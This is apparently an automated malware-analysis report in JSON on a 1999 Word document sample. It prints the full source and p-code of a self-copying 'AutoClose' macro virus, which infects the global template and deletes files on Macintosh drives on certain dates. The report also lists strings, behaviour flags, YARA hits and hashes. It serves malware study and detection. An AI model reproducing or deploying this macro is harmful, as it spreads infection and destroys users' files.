{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoClose\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Open": "May open a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "Windows": "May enumerate application windows"
        },
        "macro": "\n\n\nPublic Sub MAIN()\n    install\n    infect\nEnd Sub\n\nPrivate Sub install()\n\nDim installed\nDim i\n    total = WordBasic.CountMacros(0)\n    installed = 0\n    If total > 0 Then\n        For i = 1 To total\n            If WordBasic.[MacroName$](i, 0) = \"AutoClose\" Then\n                installed = 1\n            End If\n        Next\n    End If\n    If installed = 0 Then\n        \n               WordBasic.MacroCopy WordBasic.[WindowName$]() + \":AutoClose\", \"Global:AutoClose\"\n    Else\n        total = WordBasic.CountMacros(1)\n        installed = 0\n        If total > 0 Then\n            For i = 1 To total\n                If WordBasic.[MacroName$](i, 1) = \"AutoClose\" Then\n                    installed = 1\n                End If\n            Next\n        End If\n        If installed = 0 Then\n            WordBasic.FileSaveAs Format:=1\n            WordBasic.MacroCopy \"Global:AutoClose\", WordBasic.[WindowName$]() + \":AutoClose\"\n        End If\n    End If\nEnd Sub\n\nPrivate Sub infect()\nDim count_\nDim i\n    If (WordBasic.[GetSystemInfo$](21) = \"Windows\" Or WordBasic.[GetSystemInfo$](21) = \"Windows NT\") Then\n        Open \"c:\\shmk.\" For Append As 1\n        If LOF(1) <> 4 And WordBasic.Day(WordBasic.Now()) > 20 Then\n            \n        End If\n        Close 1\n    End If\n\n    If Mid(WordBasic.[AppInfo$](21), 1, 3) = \"Mac\" And WordBasic.Day(WordBasic.Now()) > 4 Then\n        WordBasic.ChDir \"HD:\"\n        count_ = WordBasic.CountDirectories()\n        For i = 1 To count_\n            WordBasic.ChDir \"HD\" + WordBasic.[GetDirectory$](1)\n            WordBasic.Kill WordBasic.[MacID$](\"****\")\n            WordBasic.ChDir \"HD:\"\n        Next\n    End If\nEnd Sub\n\n' Processing file: VirusShare_151eefadf2ff9df1a39141bb79fe64b5\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/AutoClose - 3309 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tArgsCall install 0x0000 \n' Line #3:\n' \tArgsCall infect 0x0000 \n' Line #4:\n' \tEndSub \n' Line #5:\n' Line #6:\n' \tFuncDefn (Private Sub install())\n' Line #7:\n' Line #8:\n' \tDim \n' \tVarDefn installed\n' Line #9:\n' \tDim \n' \tVarDefn i\n' Line #10:\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd CountMacros 0x0001 \n' \tSt total \n' Line #11:\n' \tLitDI2 0x0000 \n' \tSt installed \n' Line #12:\n' \tLd total \n' \tLitDI2 0x0000 \n' \tGt \n' \tIfBlock \n' Line #13:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd total \n' \tFor \n' Line #14:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0002 \n' \tLitStr 0x0009 \"AutoClose\"\n' \tEq \n' \tIfBlock \n' Line #15:\n' \tLitDI2 0x0001 \n' \tSt installed \n' Line #16:\n' \tEndIfBlock \n' Line #17:\n' \tStartForVariable \n' \tNext \n' Line #18:\n' \tEndIfBlock \n' Line #19:\n' \tLd installed \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #20:\n' Line #21:\n' \tLd WordBasic \n' \tArgsMemLd [WindowName$] 0x0000 \n' \tLitStr 0x000A \":AutoClose\"\n' \tAdd \n' \tLitStr 0x0010 \"Global:AutoClose\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #22:\n' \tElseBlock \n' Line #23:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd CountMacros 0x0001 \n' \tSt total \n' Line #24:\n' \tLitDI2 0x0000 \n' \tSt installed \n' Line #25:\n' \tLd total \n' \tLitDI2 0x0000 \n' \tGt \n' \tIfBlock \n' Line #26:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd total \n' \tFor \n' Line #27:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0002 \n' \tLitStr 0x0009 \"AutoClose\"\n' \tEq \n' \tIfBlock \n' Line #28:\n' \tLitDI2 0x0001 \n' \tSt installed \n' Line #29:\n' \tEndIfBlock \n' Line #30:\n' \tStartForVariable \n' \tNext \n' Line #31:\n' \tEndIfBlock \n' Line #32:\n' \tLd installed \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #33:\n' \tLitDI2 0x0001 \n' \tParamNamed Format$ \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #34:\n' \tLitStr 0x0010 \"Global:AutoClose\"\n' \tLd WordBasic \n' \tArgsMemLd [WindowName$] 0x0000 \n' \tLitStr 0x000A \":AutoClose\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #35:\n' \tEndIfBlock \n' Line #36:\n' \tEndIfBlock \n' Line #37:\n' \tEndSub \n' Line #38:\n' Line #39:\n' \tFuncDefn (Private Sub infect())\n' Line #40:\n' \tDim \n' \tVarDefn count_\n' Line #41:\n' \tDim \n' \tVarDefn i\n' Line #42:\n' \tLitDI2 0x0015 \n' \tLd WordBasic \n' \tArgsMemLd [GetSystemInfo$] 0x0001 \n' \tLitStr 0x0007 \"Windows\"\n' \tEq \n' \tLitDI2 0x0015 \n' \tLd WordBasic \n' \tArgsMemLd [GetSystemInfo$] 0x0001 \n' \tLitStr 0x000A \"Windows NT\"\n' \tEq \n' \tOr \n' \tParen \n' \tIfBlock \n' Line #43:\n' \tLitStr 0x0008 \"c:\\shmk.\"\n' \tLitDI2 0x0001 \n' \tLitDefault \n' \tOpen (For Append)\n' Line #44:\n' \tLitDI2 0x0001 \n' \tArgsLd LOF 0x0001 \n' \tLitDI2 0x0004 \n' \tNe \n' \tLd WordBasic \n' \tArgsMemLd Now 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd Day 0x0001 \n' \tLitDI2 0x0014 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #45:\n' Line #46:\n' \tEndIfBlock \n' Line #47:\n' \tLitDI2 0x0001 \n' \tClose 0x0001 \n' Line #48:\n' \tEndIfBlock \n' Line #49:\n' Line #50:\n' \tLitDI2 0x0015 \n' \tLd WordBasic \n' \tArgsMemLd [AppInfo$] 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0003 \n' \tArgsLd Mid$ 0x0003 \n' \tLitStr 0x0003 \"Mac\"\n' \tEq \n' \tLd WordBasic \n' \tArgsMemLd Now 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd Day 0x0001 \n' \tLitDI2 0x0004 \n' \tGt \n' \tAnd \n' \tIfBlock \n' Line #51:\n' \tLitStr 0x0003 \"HD:\"\n' \tLd WordBasic \n' \tArgsMemCall ChDir 0x0001 \n' Line #52:\n' \tLd WordBasic \n' \tArgsMemLd CountDirectories 0x0000 \n' \tSt count_ \n' Line #53:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd count_ \n' \tFor \n' Line #54:\n' \tLitStr 0x0002 \"HD\"\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [GetDirectory$] 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall ChDir 0x0001 \n' Line #55:\n' \tLitStr 0x0004 \"****\"\n' \tLd WordBasic \n' \tArgsMemLd [MacID$] 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Kill 0x0001 \n' Line #56:\n' \tLitStr 0x0003 \"HD:\"\n' \tLd WordBasic \n' \tArgsMemCall ChDir 0x0001 \n' Line #57:\n' \tStartForVariable \n' \tNext \n' Line #58:\n' \tEndIfBlock \n' Line #59:\n' \tEndSub \n"
    },
    "filename": "VirusShare_151eefadf2ff9df1a39141bb79fe64b5",
    "filesize": 35840,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: epform10, Author: Microsoft Corporation, Template: sample1.doc, Last Saved By: Ditry PC, Revision Number: 3, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Fri Nov  5 15:58:00 1999, Last Saved Time/Date: Fri Nov  5 15:58:00 1999, Number of Pages: 2, Number of Words: 217, Number of Characters: 1238, Security: 0",
    "hashes": {
        "md5": "151eefadf2ff9df1a39141bb79fe64b5",
        "sha1": "45ed66bf409eb2a00f5c25433287b780180b4776",
        "sha256": "b88e599265f69c790dde714c994cb5ed15a876eee67126887f25abdffec3be7c"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "epform10",
            "Wide World Importers Presents",
            "A Summer Concert",
            "Michael Rauh, Conductor",
            "May 7, 1994",
            "epform20",
            "Make plans now to attend our next concert, \"A Tribute to Mozart,\" on June 11. Director Michael Rauh steps down from the podium to perform as our featured harpsichord soloist.",
            "epform40",
            "Symphony No. 9\tDmitri Shostakovich",
            "Eight Folk Songs\tAnatol LiADOV",
            "Romeo & Juliet\tPeter Ilich TSchaikovsky",
            "epbord10",
            "Wide World Importers",
            "Interoffice Memo",
            "To:\tAll Subsidiary Managers",
            "From:\tAnne Gabor, General Manager",
            "Re:\tYearly Sales",
            "Date:\tJuly 15, 1994",
            "epbord20",
            "A Timeline for Clocks",
            "EMBED MSDraw   \\* mergeformat",
            "14th century",
            "15th century",
            "16th century",
            "17th century",
            "19th century",
            "20th century",
            "epbull10 and epbull20",
            "Precious stones",
            "Diamond",
            "Ruby and sapphire (forms of corundum)",
            "Emerald",
            "Semiprecious stones",
            "Amethyst",
            "Aquamarine",
            "Garnet",
            "Jade",
            "Moonstone",
            "Opal",
            "epstyl10",
            "Tour Details:  You arrive in Sydney at 7 P.M., in plenty of time to settle in and rest.",
            "An adventure is a dare you take personally. It's an opportunity that also involves some risk.  It is inspired by an age-old sort of challenge, and the tools it involves -- boats, planes, or snow.",
            "epfoot20",
            "Our store features diamonds, rubies, sapphires, and emeralds.",
            "  We also feature a large selection of amethyst, aquamarine, garnet, jade",
            ", moonstone, opal, quartz, topaz, tourmaline, and turquoise.",
            "Diamonds, rubies, sapphires, emeralds, and jade remain our biggest sellers.  We also have a substantial market for amethyst, aquamarine, and turquoise.",
            "epend",
            "We sell both cut and uncut preciousand semiprecious  gems.",
            "We have the region's largest selection of jade.",
            "/ =!",
            "MSDraw",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "METAFILEPICT",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "D&9aJ",
            "K K/?kQ",
            "D&9aJ",
            "K K/?kQp",
            "xS=K@",
            ",,,E",
            "ovvF",
            "6\u01f0S^?&pz\u05cfjV9O.Uwau'd}",
            "W:hh[Z}H",
            "THo5f",
            "?Sm8\"_Q",
            "\u0416O-G(\u01e0BR",
            "\u035bF\u031biO",
            "m4Ye'XDaVr1A!?",
            "H@\u02eb#",
            "E0U`[o3d",
            "c>yy<[A\u02f0\u06c10F\u06ce5crs~kn1",
            "iVVF",
            "K-{ 48.31168    139.4532    0.6868644",
            " 416,8546    34,42089    108,4716    90,4417 25,17314",
            " 416,8546    34,42089    108,4716    90,4417 25,17314",
            " 416.8546    34.42089    108.4716    90.4417 25.17314",
            " 416.8546    34.42089    108.4716    90.4417 25.17314",
            " 194.5277    40.72545    36.44505    111.4538    24.00169",
            " 263.681 23.165  48.31168    139.4532    0.6868644",
            " 416.8546    ",
            "@HP LaserJet 4",
            "LPT1:",
            "HPPCL5MS",
            "HP LaserJet 4",
            "HP LaserJet 4",
            "MSUDN",
            "HP LaserJet 4",
            "HP LaserJet 4",
            "MSUDN",
            "HP LaserJet 4",
            "+;+;",
            "_ascii($temp, $getlength));",
            "      }",
            "      close(INPUTFILE);",
            "      close(OUTPUTFILE);",
            "      system(\"L $output_file\\n\");",
            "         print (\"\\nPlease enter the offset to be used for a pattern: \");",
            "         $patoffset = <STDIN>;",
            "         chop $patoffset;",
            "         $patstart = hex $patoffset;",
            "         if ($patstart eq \"\" ) { ",
            "            $includepattern = 0; ",
            "         }",
            "      }",
            "   }",
            "epform10",
            "Microsoft Corporation",
            "sample1.doc",
            "Ditry PC",
            "Microsoft Word 8.0",
            "Attribut",
            "e VB_Nam",
            "e = \"Mod",
            "ule1\"",
            "Attribut",
            "e VB_Nam",
            "e = \"Mod",
            "ule1\"",
            "VIRUS ROOM",
            "epform10",
            "Title",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Mod",
            "ule1\"",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "AutoClose",
            ":AutoClose",
            "Global:AutoClose ",
            "AutoClose",
            "Global:AutoClose ",
            ":AutoClose",
            "Windows",
            "Windows NT",
            "c:\\shmk.",
            "**** ",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oClose\"",
            "Publi",
            "c Sub MAIN()",
            "install",
            "fect",
            "lriva",
            "Dim2 ",
            "WordBa",
            "sic.Coun",
            "tMacros(R0",
            ";> 0 T",
            "For i",
            ")1 To",
            "$](i, 0)",
            "If\tNex",
            "X Copy bWi",
            "ndow",
            "c) +",
            ", \"G`lobal\t",
            "Else",
            "cA2.",
            "g1#g",
            "I(1G(",
            ".FileSa veAs ",
            "=maxt:=",
            "sOi,x86",
            "axkat!tc!o_s",
            "[GetSystemInfoe",
            "2Os\" Or",
            " NT\")(",
            "Open \"c:\\shmk.\"a' Ap",
            "d  )((!",
            "LOF(",
            "<>0 4 A`",
            "Now()) > 2ml<&!",
            "G\", 1,l 3BU`;\"",
            "ChDir \"HD:`!",
            "ories:",
            "Kill@` ID ",
            "33822feb0",
            "43822feb0",
            "\u0650\t6\u04f5&",
            "\u0650\t6\u04f5&",
            "Wordk",
            "Win16~",
            "Win32",
            "sample16",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "TemplateProjectE",
            "Module1b",
            "AutoClose",
            "MAIN,",
            "install",
            "infectf",
            "installed",
            "totalU",
            "WordBasic",
            "CountMacros",
            "MacroName$",
            "MacroCopyE",
            "WindowName$",
            "FileSaveAs",
            "count_Q8",
            "GetSystemInfo$",
            "LOFc",
            "Now%",
            "AppInfo$3",
            "CountDirectoriesh",
            "GetDirectory$)",
            "Kill",
            "MacID$",
            "Documentj",
            "Template",
            "Project",
            "9std",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation#",
            "Forms>",
            "F2E999",
            "D01-938C",
            "-11D3-AC",
            "D9-900936D3B52",
            ".TWD#Microsoft ",
            "` Ob",
            " Library",
            "4,PJP\\VBE",
            "\\(EX(.E",
            "CxOPfficDxO@uf",
            "cBx,,",
            "DF8D04C-",
            "5BFA-101@B-BDE5@xA*A@w4",
            "2HxPR",
            "OGRAM FI",
            "LES\\MICR",
            "OSOFT OF FICE\\",
            "MSO97.DLLHZ# 8.0Z",
            "hisDocum",
            "h@6s",
            "Close",
            "ThisDocument",
            "AutoClose",
            "ID=\"{DE90FE87-9399-11D3-ACD9-900936D3B526}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoClose",
            "Name=\"TemplateProject\"",
            "HelpContextID=\"0\"",
            "CMG=\"959774ED9C86A086A086A086A0\"",
            "DPB=\"2A28CB9C619D619D61\"",
            "GC=\"BFBD5E0B6635FA36FA3605\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "sample1.doc": "Word"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.313355",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
